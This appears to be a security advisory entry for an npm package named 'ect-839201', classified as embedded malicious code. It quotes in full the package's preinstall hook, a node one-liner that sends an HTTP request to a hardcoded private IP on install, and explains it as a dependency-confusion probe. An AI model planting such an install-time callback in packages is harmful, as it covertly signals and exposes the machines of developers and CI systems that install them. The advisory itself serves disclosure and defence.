summary: Dependency-confusion probe beacons to hardcoded internal IP on install
details: The package's `preinstall` lifecycle hook in package.json executes `node -e "require('http').get('http://10.107.121.85:8000/callback_node')"`, which fires an unsolicited HTTP GET to a hardcoded RFC1918 address (10.107.121.85:8000) over plain HTTP whenever a developer or CI system runs `npm install`. The package name (`ect-839201`), description ("Probe"), endpoint path (`/callback_node`), and use of a private IP all match the dependency-confusion reconnaissance pattern: the request discloses to whoever controls 10.107.121.85 that the installer's machine successfully resolved and installed this package from the public registry, leaking the internal network position and confirming a viable namespace-confusion path into the target's environment. The package ships no other functionality.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
